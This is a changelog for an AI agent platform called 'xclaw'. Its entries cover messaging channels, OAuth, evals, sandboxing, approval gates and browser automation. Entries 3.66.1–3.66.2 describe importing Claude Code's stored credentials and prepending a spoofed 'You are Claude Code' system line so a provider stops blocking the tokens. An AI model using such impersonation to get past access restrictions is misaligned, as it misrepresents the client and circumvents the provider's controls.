- Fixtures: Telegram, Slack (message/app_mention), Discord, Email, WebChat
- Shared path: commands → rate limit → replyWithAgent
- Tests: channel-runtime-multi, agent-loop-mock (vault identity)

## 3.4.2 — Account linking L3 vault merge

- vaultMergeIntoAccount on linkIdentities
- Per-app last-write-wins by updatedAt
- Source vault dirs renamed to *.bak-<ts>
- CLI: xclaw auth accounts migrate <accountId>

## 3.4.1 — Account linking L2 pairing codes

- createPairingCode / consumePairingCode (single-use, TTL)
- Channel commands: /link, /link CODE, /link status, /unlink
- userId passed from Slack/Telegram/Discord/WebChat into commands

## 3.4.0 — Account linking L1

- normalizeChannelUserId (`channel:nativeId`)
- ~/.xclaw/accounts/links.json store
- link / unlink / list / create CLI
- replyWithAgent resolves vault user via linked account
- Discord userId wired into replyWithAgent

## 3.3.3 — Grafana dashboard + Slack app_mention + vault userId + alerts

- deploy/grafana/xclaw-dashboard.json
- deploy/grafana/xclaw-alerts.yaml + xclaw-alert-rules.json
- Slack Socket Mode handles **app_mention**
- Channel userId → AsyncLocalStorage → vaultResolveToken (Slack/Telegram/Discord)
- docs updates

- deploy/grafana/xclaw-dashboard.json (Gateway + Slack WS latency)
- deploy/grafana/README.md import + scrape notes

## 3.3.0 — P6 ops scale

- Multi-user token vault (`~/.xclaw/vault/<user>/`)
- Slack Socket Mode restored + reconnect backoff
- GitHub Actions: `.github/workflows/eval-regression.yml`
- `npm run docker:publish` / `docker:push`
- docs/PHASE_P6.md

## 3.2.0 — P5 OAuth ops

- Proactive connected token refresh scheduler
- `auth connected logout`
- Doctor checks for expiring/invalidated tokens
- Gateway `/oauth/callback` exchange
- AES-256-GCM token store (`XCLAW_TOKEN_STORE_KEY`)
- Mock provider refresh tests

## 3.1.4 — OAuth retry logic

- withOAuthRetry + isOAuthRetryable (decorrelated jitter default)
- Retries token exchange + refresh on network/429/5xx
- Honors Retry-After; never retries reauth errors
- docs/OAUTH_RETRY.md

## 3.1.3 — OAuth error handling details

- src/auth/oauth-errors.mjs: stable codes, hints, reauth/retryable flags
- Wired into oauth-browser + token-refresh
- docs/OAUTH_ERROR_HANDLING.md

## 3.1.2 — Token refresh logic

- ensureFreshToken with 5m expiry skew
- Single-flight refresh lock per app
- Refresh-token rotation + invalid_grant invalidation
- resolveToken auto-refresh; github_request 401 retry
- docs/TOKEN_REFRESH.md

## 3.1.1 — OAuth browser login (connected apps)

- PKCE helpers + generic loopback OAuth (`src/auth/oauth-browser.mjs`)
- Connected providers: GitHub, Google
- CLI: `xclaw auth connected login|refresh|status|list`
- Shorthand: `xclaw auth login --connected github`
- Tokens → `~/.xclaw/connected-tokens.json`
- docs/OAUTH_BROWSER.md

## 3.1.0 — P4 production publish

- Gateway authStrict + optional TLS (`XCLAW_GATEWAY_TOKEN`, `XCLAW_TLS_*`)
- Slack Socket Mode (`appToken` / `SLACK_APP_TOKEN`)
- Imagine model matrix (`src/media/imagine-models.mjs`)
- `npm run eval:regression`
- Dockerfile + docs/PUBLISH.md + docs/PHASES_P0_P4.md
- Release: XCLAW_RELEASE_v3.1.0.zip

## 3.0.0 — P3 platform

- Connected catalog: voice, github, generic_http + token store
- Neural TTS (API → espeak/piper)
- x_semantic_search, artifacts UI, browser_clipboard/pdf
- Persistence docs + watchdog

## 2.9.0 — P2 channels

- Slack poll channel, Email IMAP/SMTP, Discord attachments
- pptx template pack, Office script helpers

## 2.8.0 — P1 media

- view_x_video, stronger search_images, generate/edit_image, vision defaults

## 2.7.0 — P0 foundation

- Office skill trees, browser_screenshot/snapshot, Telegram media, LO profile isolation + UNO optional

## 2.6.0 — Full tool parity push

- Media: ocr, office_convert, view_image, search_images, generate_image, edit_image
- Finance: finance_quote (Polygon/CoinGecko)
- X: x_keyword_search, x_user_search, x_thread_fetch
- Connected: search_connected_tools, call_connected_tool (voice)
- Unified src/tools/registry.mjs
- docs/FULL_TOOL_SURFACE.md

## 2.5.10 — Extra tools (glob, grep, web_fetch, web_search)

- Agent tools: `glob`, `grep`, `web_fetch`, `web_search` (UI parity)
- Wired into agent loop list + execute
- Marked safeAuto (no approval under risky)
- Config merge fix: user security wins over profile
- docs/EXTRA_TOOLS.md, docs/APPROVALS.md

## 2.5.9 — Live model discovery

- Disk-cached live discovery (`~/.xclaw/cache/models/`, 1h TTL)
- Adapters: OpenAI-compat, xAI language-models, Anthropic, Gemini
- Chat filter by default; `--all` for full list
- CLI: `models list --live|--force|--all`, `models refresh`, `models cache-clear`
- docs/MODEL_DISCOVERY.md

## 2.5.8 — Latest model IDs (Aug 2026)

- OpenAI: GPT-5.6 Sol/Terra/Luna, 5.5, 5.4 family, o3/o4-mini, Codex
- Anthropic: Claude Fable 5, Opus/Sonnet 5, Opus 4.8/4.7/4.6, Sonnet 4.6, Haiku 4.5
- Google: Gemini 3.6/3.5 Flash, 3.1 Pro, 2.5 family
- xAI: Grok 4.5 default + full 4.20 / Build line
- Defaults: xai→grok-4.5, openai→gpt-5.4, anthropic→claude-sonnet-5, google→gemini-3.6-flash

## 2.5.7 — Full provider model catalogs

- Expanded static catalogs: xai, openai, anthropic, google, deepseek, groq, mistral, together, ollama, openrouter
- Multiple models per provider (OpenClaw-style shipped catalog)
- `xclaw models list --live` merges GET /models discovery when API key present
- docs/PROVIDERS.md updated

## 2.5.6 — Phase 5 ops freeze gate

- `scripts/release-gate.mjs` — unit tests, security-audit, sandbox-redteam, fire-drill, evidence
- `npm run release-gate` / `release-gate:quick` / `release-gate:strict`
- `xclaw release-gate`
- docs/PHASE_5.md

## 2.5.5 — Phase 4 OAuth policy

- Explicit per-provider auth policy (API key first)
- xAI OAuth only with client id; clear errors pointing at console.x.ai
- Optional OpenAI Codex PKCE (`XCLAW_OPENAI_OAUTH_CLIENT_ID`)
- `xclaw models auth policy`
- docs/OAUTH.md

## 2.5.4 — Phase 3 seats

- Per-peer daily USD + token caps (`seats.enabled`)
- Job preflight hard deny + post-job ledger
- CLI `xclaw seats status|check|reset|pause`
- Channel `/seat` · `GET /seats`
- docs/SEATS.md — API credits ≠ Grok subscription seats

## 2.5.3 — Phase 2 provider registry

- Provider registry: xai, openai, anthropic, openrouter, compatible + custom `models.providers`
- Model refs `provider/model`; `xclaw models list|providers|route`
- Minimal `xclaw onboard --auth-choice xai-api-key|custom-api-key`
- docs/PROVIDERS.md

## 2.5.2 — Phase 1 auth profiles

- OpenClaw-style `auth-profiles.json` per agent under `~/.xclaw/agents/<id>/`
- Modes: `api_key`, `token`, `oauth` with ordered resolve + file-locked refresh
- CLI: `xclaw models status` · `xclaw models auth login|list|order|logout|resolve`
- `loadConfig` resolves token via profile chain before legacy credentials

## 2.5.1 — xAI auth

- **`xclaw auth login --api-key`** stores key in `~/.xclaw/credentials.json` (0600)
- **`xclaw auth login --oauth`** PKCE scaffold (requires `XCLAW_XAI_OAUTH_CLIENT_ID`)
- Token resolution: config → env → credentials → Grok CLI session
- docs/AUTH.md

## 2.5.0 — Phase S (LTS freeze)

- **Security audit**: `xclaw security-audit`, `GET /security/audit`, doctor integration
- **docs/SECURITY.md** deploy checklist
- **docs/LTS.md** — bugfix / soak-gated features for 2.5.x

## 2.4.0 — Phase R

- **Cost governor dashboard**: Control UI bar + pause/resume
- **WebChat checkpoints**: sidebar list + Resume
- **Provider pack**: xai / openai / openrouter / compatible (`XCLAW_PROVIDER`)
- **Multi-workspace isolation** helpers + tests

## 2.3.0 — Phase Q (production proof tooling)

- **7-day soak**: `SOAK_NIGHTS=7 SOAK_MIN_NIGHTS=7 npm run soak:nights` / `npm run soak:7`
- **Fire-drill**: `xclaw fire-drill` — computer_down, cost_hard, recover, alerter ping
- **Computer auth proxy**: `xclaw computer-proxy` verifies token before upstream
- **Sandbox red team**: deterministic `npm run sandbox-redteam` (no model)

## 2.2.0 — Phase P

- **SLO auto-alerts**: monitor interval + `xclaw slo-check` / `POST /slo/check`
- **WebChat command parity**: /job /queue /approve /resume /help
- **Flake quarantine**: auto-tag; excluded from releaseGate; `xclaw quarantine`
- **docs/RUNBOOK.md** operator runbook 2.0

## 2.1.0 — Phase O

- **Computer auth**: Bearer/`XCLAW_COMPUTER_TOKEN` + optional HMAC; client sends headers
- **Sandbox red team** case `sandbox-escape-denied`
- **Queue load**: `npm run queue:load` (interactive before batch + aging)

## 2.0.0 — Phase N (evidence cut)

- **Multi-night soak**: `npm run soak:nights` (live + 3-night ledger stamp)
- **Skill A/B case**: `skill-ab-trap` for measured learning loop
- **Strict evidence**: `REQUIRE_SOAK=1 npm run evidence` requires nightsOk
- Semver **2.0** — architecture complete; releases gated on scoreboard + soak

## 1.9.0 — Phase M

- **Queue priority classes**: interactive/batch/cron + aging anti-starvation
- **Approval digests**: `xclaw digest`, `POST /security/digest`, optional interval
- **Sandbox**: path escape deny + read-only; tool guard in agent loop
- **SLOs**: `xclaw slo`, `GET /slo` (job wall p99, computer, approvals)
- **eval:ci** runs computer-contract tests first

## 1.8.0 — Phase L

- **Skill A/B harness**: `xclaw skill-ab --id|--tag`, auto propose+install on fail, re-eval, metrics
- **Structured claims default** on tags campaign/long/campaign-v2 via `jobs.structuredClaimsOnTags`
- Prod profile enables groundHard + claimsRequireEvidence

## 1.7.0 — Phase K (evidence)

- **Campaign stress v2**: chaos (decoys), api health, migrate (+ prior campaign cases)
- **Soak ledger**: `npm run soak`, flake jsonl, summary gate (3 nights)
- **Evidence release**: `npm run evidence` → `eval/baselines/evidence-v*.json`

## 1.6.0 — Phase J (reliability)

- **Cost governor**: daily soft/hard USD caps; queue pause on hard; `xclaw cost`
- **Channel hardening**: `allowedCommands`, per-chat `workspaceByChatId`
- **Computer contract tests**: health API shape without Chromium
- Reliability freeze notes in docs/PHASE_J.md

## 1.5.0 — Phase I

- **Checkpoint UI**: Control UI list + one-click resume; `GET/POST /checkpoints`
- **Approval SLA**: age/remaining on pending; auto-deny/approve after `approvalSlaMs`
- **Worktree merge**: `xclaw merge <subagentId>`, `POST /subagents/merge`

## 1.4.0 — Phase H

- **Campaign eval**: `--tag campaign` + `npm run eval:campaign`
- **Structured claims**: JSON `claims` + `evidence_ids` block; requireStructuredClaims
- **Skill loop metrics**: `xclaw skill-loop`, scoreboard.skillLoop.helpRate

## 1.3.0 — Phase G

- **Channel job mode**: `/job` `/queue` `/approve` `/pending` `/resume` on Telegram & Discord
- **Checkpoints**: auto-save; `xclaw resume <id>`; recovery classify + replay
- **Prod policy matrix**: safe / write / exec / network
- **Remote computer**: `XCLAW_COMPUTER_URL` + `deploy/docker-compose.sidecar.yml`

## 1.2.0 — Phase F

- **Skill promotion**: job fail → proposal; `xclaw skills proposals|install|reject`
- **Git worktree subagents**: `worktree: true` + merge diff report
- **Context pressure meter**: adaptive eviction tweaks (events: `cache.pressure`)

## 1.1.0 — Phase E

- **Long-horizon eval pack** (`--tag long`): app fix, docs set, ETL, grounded report
- **Claim–evidence scorer v2**: citations `[ev:id]` / `(tool:name)`; orphan claim detection
- **Autonomy scoreboard**: `GET /eval/scoreboard`, `xclaw scoreboard`, Control UI

## 1.0.0 — Phase D

- **1.0 API freeze** (`GET /routes`, ops probes stable)
- **Docker** + **docker-compose** + **systemd** unit + **logrotate**
- Gateway token protects jobs/queue/agent; optional `/metrics` protection
- Secrets-via-env only for production (`deploy/env.example`)
- README golden path · `docs/RELEASE_1.0.md`

## 0.12.0 — Phase C

### Approvals
- `approvalPolicy`: always | risky | never
- `safeAuto` tools never need approval under risky
- Control UI Approvals card + `/security/policy`

### Durable memory
- `~/.xclaw/memory/<hash>/` events + MEMORY.md
- Jobs auto-remember; agent loads durable memory into context
- `GET /memory?workspace=`

### Subagents
- `isolate: true` → temp workspace
- Returns toolTrace + workspace for parent merge

## 0.11.0 — Phase B

### Hard eval pack
- Cases: hard-fix-sum, hard-pipeline-merge, hard-config-toggle, hard-todo-complete, hard-ground-no-invent
- Tag: `hard`

### Grounding hard mode
- Stronger claim detection; `groundHard` fails job on ungrounded action/content claims
- Eval: `replyContains` / `replyNotContains` / `requireEvidence`

### Tool result discipline
- Per-tool truncation budgets (bash / browser / file_read / file_write)

## 0.10.0 — Phase A

### Computer reliability
- Supervised computer: **PID file**, **log file**, **meta**, stale-pid cleanup
- CLI: `xclaw computer status|stop|restart|log|start [--bg]`
- Longer start timeout (45s); stop kills by PID file

### Eval CI gate
- `npm run eval:ci` — wait-ready → tag suite → baseline regress
- `eval:suite` appends `eval/baselines/trend.jsonl`

## 0.9.10

- Watchdog **restart backoff** (`minRestartIntervalMs` default 60s)
- **Circuit open** after `maxConsecutiveFails` (default 5)

## 0.9.9

- Watchdog **restartCount**, **lastRestartAt**, **lastCheckAt**, **lastError**
- Prometheus `xclaw_computer_watchdog_restarts`

## 0.9.8

- Watchdog visible in **doctor**, **dashboard**, and **Prometheus** (`xclaw_computer_watchdog_active`)
- ensureComputer normalizes bind-any hosts for URL reporting

## 0.9.7

- **Computer watchdog**: periodic health check + auto-restart (default 30s)
- Config `computer.watchdog.enabled` / `intervalMs`

## 0.9.6

- Hardened computer health probe (0.0.0.0→127.0.0.1, accept ok/healthy shapes)

## 0.9.5

- **`npm run dev-up`**: start gateway (background) + wait-ready

## 0.9.4

- eval-suite / eval-ci wait for readiness before live runs
- INSTALL.md scripted live-run notes

## 0.9.3

- **`xclaw wait-ready`**: poll readiness; auto `ensureComputer` unless `--no-start`
- Flags: `--timeout 60000` `--interval 1000`

## 0.9.2

- **`xclaw info`**: version + profile + ready + queue one-liner (exit 1 if not ready)

## 0.9.1

- **Route map**: `GET /routes`, `xclaw routes`, docs/API.md

## 0.9.0

- **GET /version** + `xclaw version` (version, profile, uptime)
- Uptime in dashboard + Prometheus `xclaw_uptime_seconds`

## 0.8.9

- **Soft config reload**: SIGHUP or `POST /config/reload` (safe keys only; no port rebind)

## 0.8.8

- **Graceful shutdown**: pause queue, drain running jobs (up to shutdown.drainMs), then stop computer

## 0.8.7

- **Prometheus metrics**: `GET /metrics` (queue, computer, eval spend)

## 0.8.6

- **Readiness probe**: `GET /ready`, `xclaw ready` (computer + queue depth)
- Config `readiness.requireComputer` / `maxQueued`

## 0.8.5

- `xclaw report --out <file>`
- Eval cron appends status report to log
- docs/REPORT.md

## 0.8.4

- **Markdown status report**: `xclaw report`, `GET /report`
- Dashboard version from package.json

## 0.8.3

- **Dashboard** snapshot: `GET /dashboard`, `xclaw dashboard`, Control UI
- Aggregates computer, queue, eval spend/cron, profile

## 0.8.2

- Queue **stats** + **dead letter** list (CLI/API)
- docs/QUEUE.md

## 0.8.1

- Queue **retry failed** + per-item **maxAttempts** / **timeoutMs**
- Auto-requeue on failure until maxAttempts

## 0.8.0

- Queue **cancel** item + **clear** completed (CLI, API, Control UI)
- `POST /queue/:id/cancel`, `POST /queue/clear`

## 0.7.9

- Queue **pause/resume** (CLI, API, Control UI)
- Doctor reports **eval.spend** when caps configured

## 0.7.8

- **Batch queue**: `xclaw queue batch <file.json|jsonl>`
- **Spend thresholds**: `eval.spend.maxUsdPerWindow` + `xclaw eval-spend check`
- Scheduled eval runs spend check after suite

## 0.7.7

- **Eval spend rollup**: `GET /eval/spend`, `xclaw eval-spend`, Control UI Spend
- Aggregates costUsd / tokens across eval history

## 0.7.6

- Eval **estimated USD cost** on reports + history (`costUsd`)
- Longer model-key match for rate table (gpt-4o-mini vs gpt-4o)

## 0.7.5

- Queue **concurrency** config (1–3, default 1); `GET /queue` returns worker status
- Eval **stress-weekly-report** (CSV totals + best day) — live PASS
- Baseline **10/10** on grok-4.3

## 0.7.4

- Deploy **profiles**: dev / lab / prod (`XCLAW_PROFILE`, `xclaw profile list|show`)
- Eval case **project-add-multiply** (extend JS lib + tests) — live PASS
- Baseline **9/9** on grok-4.3

---

## 3.75.0 — Verify pass (strong model on final answer)

- `src/providers/verify-pass.mjs` — VERIFY_OK / VERIFY_REVISE protocol
- Agent loop runs verify when `router.roles.verify` is set and final text has no tools
- Soft mode: emit `verify_suggest`; hard mode: `rolePolicy.verifyReplace: true`
- Tests: `test/verify-pass.test.mjs`

## 3.74.0 — Native computer default + session API

- Default `computer.engine: "native"` (thin server, not 16MB bundle)
- `src/computer/engine.mjs` — resolveComputerEngine / isNativeComputer
- Thin server implements `/xclaw/sessions/*` for computer-client compatibility
- Bundle via `computer.engine: "bundle"` or `XCLAW_COMPUTER_NATIVE=0`
- Tests: `test/computer-engine.test.mjs`

## 3.73.0 — Role routing (draft / act / verify)

- `src/providers/role-router.mjs` — role map, policy, role-aware provider facade
- Agent loop: optional multi-model by turn (draft first, then act)
- Config: `router.roles`, `router.rolePolicy`, `XCLAW_ROLE_DRAFT` / `_ACT` / `_VERIFY`
- Events: `router` phase `role` | `roles_ready` | `role_failover`
- Tests: `test/role-router.test.mjs`

## 3.72.0 — Multi-provider failover router

- `src/providers/failover-router.mjs` — model chain, shouldFailover, createFailoverProvider
- Agent loop uses failover by default (`router.enabled !== false`)
- Config: `agent.fallbackModels`, `router.chain`, `router.roles`, `XCLAW_FALLBACK_MODELS`
- Failover on 429/5xx/transient/auth; skip permanent 4xx
- Events: `router` phase chain|failover|skip|ready
- Tests: `test/failover-router.test.mjs`

## 3.71.0 — P0 thin computer server + clean browser_tab

- `modules/browser-tab-tool.mjs` — lightweight fetch-based tab (CDP upgrade path)
- `thin-server.mjs` — `/health` `/tools` `/call` `/extraction` without 16MB bundle
- `manager.startComputer` uses thin server when `XCLAW_COMPUTER_NATIVE=1` or `computer.nativeServer`
- Native pack includes browser_tab

## 3.70.0 — P0 computer extraction (clean native tools)

- CLEAN modules: `modules/bash-tool.mjs`, `modules/file-tools.mjs` (no bundle scope)
- `native-tools.mjs` registry + `executeNativeTool`
- `extraction-status.mjs` + `scripts/check-extraction.mjs`
- MODULE_MAP updated with cleanStandaloneTools
- Tests: `test/native-tools.test.mjs`
- Next: browser_tab clean module + thin HTTP router over native pack

## 3.69.0 — xclaw_recall durable memory retrieval

- `src/memory/recall.mjs` — keyword recall over events.jsonl + optional swarm receipts
- Tool `xclaw_recall` wired into agent loop (register + execute)
- Config: `memory.recall=false` to disable
- Tests: `test/recall.test.mjs`

## 3.68.0 — Context compaction (P0 long-horizon)

- `src/tokens/compaction.mjs` — tool offload to disk + extractive fold under pressure
- Agent loop: after eviction, runs `compactMessages` when pressure ≥ trigger
- Protects leading system (OAuth attestation / cache prefix)
- Config: `tokens.compaction.*` (enabled, triggerPressure, foldPressure, offloadThresholdChars)
- Tests: `test/compaction.test.mjs`

## 3.67.0 — Full Claude OAuth in agent loop

- Native Anthropic Messages provider (`src/providers/anthropic-messages.mjs`)
- OAuth attestation + headers automatic for `sk-ant-oat*` tokens
- Agent loop resolves auth profiles async (anthropic oauth profile)
- Registry: anthropic api = anthropic-messages
- Models: sonnet/opus/fable/haiku selectable via agent.model

## 3.66.2 — OAuth system attestation (sudo-ai parity)

- Required system prefix: `You are Claude Code, Anthropic's official CLI for Claude.`
- Without it, Sonnet/Opus/Fable return misleading 429 rate_limit_error on OAuth
- `src/providers/anthropic-oauth-headers.mjs` — headers + ensureOAuthSystemAttestation
- Verified live: Sonnet/Fable/Opus 200 with attestation

## 3.66.1 — Claude Code binary endpoint parity + credential import

- Defaults aligned with Claude Code 2.1.226 native strings (`platform.claude.com/v1/oauth/token`)
- `importClaudeCodeCredentials` reads `~/.claude/.credentials.json` (`claudeAiOauth`)
- CLI: `--method import-claude-code`

## 3.66.0 — Claude / Anthropic OAuth PKCE

- `src/auth/anthropic-oauth.mjs` — PKCE authorize URL, paste-code exchange, refresh
- `oauth-policy` anthropic kind `claude_pkce`
- CLI: `xclaw models auth login --provider anthropic|claude --method oauth`
- Registry env: `CLAUDE_CODE_OAUTH_TOKEN`, `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_API_KEY`
- Docs: `docs/AUTH_CLAUDE_OAUTH.md`

## 3.65.0 — S2 merge/vote use receipts

- `evaluateReceiptPolicy`, `receiptVoteWeight`, `buildRunReceiptSummary`
- Merge gates fail when `requireReceipts` and implement/verify/critic lack receipts
- Vote weights multiply by receipt quality (missing → 0.25 or 0 if hard)
- Swarm run stores `receiptSummary` + returns `receipts` policy summary
- Config: `swarm.requireReceipts` or `XCLAW_SWARM_REQUIRE_RECEIPTS=1`

## 3.64.1 — Swarm failure receipts completeness

- Receipts on retry-exhausted failures and skipped nodes (`UPSTREAM_FAILED`, `DEPS_NOT_TERMINAL`)
- Docs: failure handling table in SWARM_RECEIPTS.md

## 3.64.0 — S1 universal swarm node receipts

- `src/agents/swarm-receipt.mjs` — build/write/list receipts for any domain (shell, files, repo, browser, …)
- Effects inferred from tool trace; browser fields optional
- `swarm-run` attaches receipt on node success and final failure
- Stored at `~/.xclaw/swarms/runs/<swarmId>/receipts/<nodeId>.json`
- Tests: `test/swarm-receipt.test.mjs`

## 3.63.0 — C2 trusted fabric role at swarm spawn

- `mapSwarmRoleToFabric` / `bindSwarmSpawnRole` in role-binding
- `spawnSubagent` binds fabric role when role/swarmRole set (spawn id + session id)
- swarm-run passes node role into spawn
- Agent loop resolves role from session bind (not free env) for browser belt
- `xclaw_spawn_subagent` accepts `role` enum
- Tests: `test/browser-c2-swarm-role.test.mjs`

## 3.62.0 — C1 auto-renew tab lease heartbeat

- `src/browser/lease-heartbeat.mjs` — start/stop/touch/acquireWithHeartbeat
- hooks: touch + start heartbeat on successful beforeNavigate/beforeInput when fabric enforce + tabId
- `tab_lease` acquire starts heartbeat; release stops; renew/heartbeats actions
- Env: `XCLAW_TAB_LEASE_HEARTBEAT`, `XCLAW_TAB_LEASE_HEARTBEAT_MS`, `XCLAW_TAB_LEASE_TTL_MS`
- Tests: `test/browser-c1-heartbeat.test.mjs`

## 3.61.0 — B4 alerting polish

- Alerter: `alertLiveE2eFailure`, `alertEnforcementFailure`
- Targets inherit `liveE2e.cron.delivery` (and doctor delivery)
- live-e2e cron uses shared live-e2e alert helper
- Doctor cron runs CLI `a.*`/`h0.*` enforcement slice and alerts on errors
- Doctor `quiet` option for scheduled runs
- Tests: `test/alerting-b4.test.mjs`

## 3.60.0 — B3 live e2e cadence

- `src/cron/live-e2e-job.mjs` — run + log + optional alert; ensureLiveE2eCronJob (default 24h)
- CLI: `xclaw live-e2e`, `xclaw live-e2e-schedule [everyMs]`
- docs/PROD_PRESET.md + OPS.md — nightly/pre-release/systemd timer
- npm: `live-e2e:cron`, `live-e2e:schedule`

## 3.59.0 — B2 production enforcement preset

- `docs/PROD_PRESET.md` — copy-paste prod/lab env, verify commands, checklist, incident hints
- `OPS.md` — Production enforcement preset section linking full doc

## 3.58.0 — B1 release-gate A-enforcement

- `release-gate` always runs `a-enforcement-e2e` (required, including `--quick`)
- `bundle-markers` step requires A2/A4/A5 strings in xclaw-server.mjs
- `--live` / `XCLAW_LIVE_E2E=1` adds live-enforcement-e2e
- npm: `release-gate:live`, `check-bundle-markers`
- Offline A-smoke exit 1 (warnings) treated as pass for gate; exit 2 fails release

## 3.57.0 — A8 fabric durability (locks + heartbeat)

- `src/browser/fabric-lock.mjs` — cross-process exclusive lock with stale reclaim
- Leases, gates, clock, session roles RMW under `withFabricLock`
- `renewTabLease` heartbeat (TTL extend + heartbeatCount)
- `tab_lease` tool action `renew`
- Tests: concurrent lock serialization, steal denied, parallel tabs, gate lock

## 3.56.0 — LIVE-E2E enforcement script

- `scripts/live-enforcement-e2e.mjs` — starts computer if needed, session + tools/call probes
- Asserts commit gate on /checkout, jsCode motor block, read js allowed, optional motor/nav
- Flags: `--json` `--no-start` `--keep`
- npm: `live-e2e` / `live-enforcement`

## 3.55.0 — A7 bypass closure (jsCode + role binding)

- `src/browser/jscode-policy.mjs` — block click/type-like jsCode under fabric/prod
- `src/browser/role-binding.mjs` — session-bound roles; env ignored under strict unless XCLAW_ROLE_FROM_ENV=1
- hooks beforeInput checks jsCode + resolveRole
- Bundle + gateway pass jsCode into beforeInput
- Tool: `session_role` bind|get|resolve
- Doctor: a.jscode_* + a.role_binding
- Tests: `test/browser-a7-bypass.test.mjs`

## 3.54.0 — A6-ops: doctor enforcement + e2e smoke

- Doctor section `a.*`: bridges, hooks, motor, chrome-args, role checks, bundle markers, prod strict
- `scripts/a-enforcement-e2e.mjs` — offline-first Phase A smoke (exit 0/1/2)
- npm scripts: `a6` / `a-enforcement`
- Env: `XCLAW_ROOT`, `XCLAW_ENFORCEMENT_STRICT=1` / `profile=prod` for hard gates in doctor

## 3.53.0 — Phase A5 single Chrome argv path

- `src/computer/chrome-args.mjs` — canonical buildChromeArgs (H0 + MITM + sandbox)
- `src/computer/chrome-args-bridge.mjs` — computer process loader
- Bundle `ensureRunning` replaces argv via bridge before spawn
- Clean `browser-service.mjs` uses same builder before spawn
- manager sets XCLAW_CHROME_ARGS_BRIDGE
- Tests: `test/chrome-args.test.mjs`
- Phase A (A1–A5) enforcement plane complete for launch + navigate + fabric + motor

## 3.52.0 — Phase A4 humanized CDP motor

- `src/browser/motor.mjs` — planClick/Type/Scroll via Fitts + key delays → Input.dispatch* steps
- `src/computer/motor-bridge.mjs` — load + runMotorOnClient
- `xclaw_browser_tab` accepts `motor: { op, x, y, text, ... }` and executes on tabClient
- Agent tools: `browser_click`, `browser_type`
- manager injects XCLAW_MOTOR_BRIDGE
- Tests: `test/browser-motor.test.mjs`

## 3.51.0 — Phase A3 fabric on more actuation paths

- Tab tool `call` entry runs `beforeInput` (lease + role) before any act
- Navigate path keeps `beforeNavigate` + `afterAction` binding
- Gateway belt: agent loop checks hooks before `computer.callTool` for `xclaw_browser_tab`
- Read-only observe allowed for observer; evaluate/navigate still motor-gated
- Auto-acquire lease via `XCLAW_TAB_LEASE_AUTO=1` under fabric enforce
- Tests: `test/browser-hooks-a3.test.mjs`

## 3.50.0 — Phase A2 driver hooks on navigate path

- `src/browser/hooks.mjs` — beforeNavigate / beforeInput / afterAction / buildChromeArgs
- `src/computer/hooks-bridge.mjs` — resolve + load hooks from computer process
- `xclaw-server.mjs` — Page.navigate calls beforeNavigate (fail-closed when gates/enforce on)
- `manager.mjs` — injects XCLAW_ROOT + XCLAW_HOOKS_BRIDGE into computer env
- Enforcement: XCLAW_COMMIT_GATES, XCLAW_FABRIC_ENFORCE, role caps, tab leases
- Tests: `test/browser-hooks.test.mjs`

## 3.49.3 — Full computer bundle mapped + app layer extracted

- `src/computer/MODULE_MAP.json` — complete ~16.8MB / 395k-line region map
- `src/computer/modules/*` — all xclaw_* tools + skills/context + HTTP main extracted
- Clean `browser-service.mjs` remains the importable Chrome owner
- Vendored ~380k lines left in bundle by design; app ~15k lines now addressable

## 3.49.2 — Clean BrowserService module extracted from computer bundle

- `src/computer/browser-service.mjs` — importable, syntax-checked BrowserService (from xclaw-server.mjs)
- `src/computer/browser-tab-tool.extracted.mjs` — reference extract of xclaw_browser_tab
- `docs/COMPUTER_EDITABLE_MODULES.md` — edit-here vs run-there contract
- A2 can attach hooks on the clean module instead of string-patching 16MB

## 3.49.1 — Phase A1: Computer source of truth

- Documented that `src/computer/xclaw-server.mjs` (~16.8MB bundle) **is** the Chrome/CDP source — no pre-bundle tree in-repo
- Ownership map: `manager.mjs` lifecycle, `BrowserService.ensureRunning` launch, `xclaw_browser_tab` actuation
- Artifacts: `docs/COMPUTER_SOURCE_OF_TRUTH.md`, `src/computer/SOURCE_OF_TRUTH.json`
- Defines A2 hook targets (beforeNavigate / beforeInput / afterAction / buildChromeArgs)

## 3.49.0 — Horizon 5 Time-travel & causal eval

- `src/browser/timetravel.mjs` — loadTimeline, replay plan, scoreCausal, synthetic origin server
- Eval `scoreCase` honors `expect.causal` / `expect.network` / forbidHosts
- Tools: `trace_replay`, `trace_score`
- Offline synthetic HTTP origin from recorded flows (`startSyntheticOrigin`)
- Sample case: `eval/cases/causal-network.json`
- Tests: `test/browser-timetravel.test.mjs`

## 3.48.0 — Horizon 4 Session Physics + Swarm fabric

- `src/browser/physics.mjs` — tab leases, commit gates, role caps, logical clock
- Tools: `tab_lease`, `commit_gate`, `fabric_status`
- Roles: observer / actor / critic / planner motor permissions
- Commit-sensitive URL patterns (checkout, pay, delete, transfer, …)
- Swarm roles extended: actor, observer + critic fabric instructions
- Persist under `~/.xclaw/fabric/` (`XCLAW_FABRIC_DIR`)
- Env: `XCLAW_COMMIT_GATES=1`, `XCLAW_TAB_LEASE_TTL_MS`, `XCLAW_AGENT_ID`
- Tests: `test/browser-physics.test.mjs`

## 3.47.0 — Horizon 3 Motor + Identity maturity

- Motor v2: Fitts-law `fittsDuration` / `fittsID`, `readingPause`, mousePath uses targetWidth for MT
- `humanClick` optional label → reading pause before move
- Origin-partitioned profiles: `resolveOriginProfile`, `sanitizeOriginHost`, `listOriginProfiles`
  - `XCLAW_BROWSER_PROFILE_MODE=origin|shared`
  - `XCLAW_BROWSER_ORIGIN_ROOT` override
- NSS CA trust: dual import (profile DB + nssdb/), explicit trustOrder fallback chain
- Tests: `test/browser-horizon3.test.mjs`

## 3.46.0 — Horizon 2 Truth control plane

- `src/browser/truth.mjs` — policy DSL load/save/match/evaluate, require-rules, proof export
- `confdir/policy.json` merged into mitmproxy block/map (addons.py)
- Agent tools: `mitm_policy`, `mitm_export`
- Agent loop: `XCLAW_TRUTH_AUTO_ASSERT=1` runs require-rules after browser_* tools
- Proof bundle: redacted flows + bindings + policy summary + sha256
- Docs: policy DSL in MITM_SCRIPTING.md
- Tests: `test/browser-truth.test.mjs`

## 3.45.0 — Horizon 1 Fusion Sense

Structure-first observation + action↔network causal binding:

- `src/browser/sense.mjs` — actionId, network cursor/delta, bindActionFlows, assertOutcome, STRUCTURE_SNAPSHOT_JS
- `browser_observe` — primary sense tool (structure, not pixels)
- `browser_snapshot` — a11y-oriented interactive tree + network delta footer
- `browser_assert` — outcome assertions against MITM flows / action bindings
- `withNetworkBinding()` — wrap any tool execute with actionId + flow delta
